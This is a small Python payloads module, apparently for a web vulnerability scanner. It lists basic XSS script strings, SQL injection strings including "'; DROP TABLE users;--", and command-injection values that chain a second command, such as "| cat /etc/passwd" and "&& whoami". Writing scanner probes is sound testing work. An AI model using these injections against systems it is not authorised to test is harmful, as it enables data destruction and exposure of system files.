# payloads.py

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users;--"
]

CMDI_PAYLOADS = [
    "; ls",
    "| cat /etc/passwd",
    "&& whoami"
]

CSRF_PAYLOADS = [
    "csrf_test_payload"  # Just a dummy payload; detection is mostly based on form structure
]

def get_payloads(vuln_type):
    if vuln_type == "xss":
        return XSS_PAYLOADS
    elif vuln_type == "sqli":
        return SQLI_PAYLOADS
    elif vuln_type == "cmdi":
        return CMDI_PAYLOADS
    elif vuln_type == "csrf":
        return CSRF_PAYLOADS
    else:
        return []
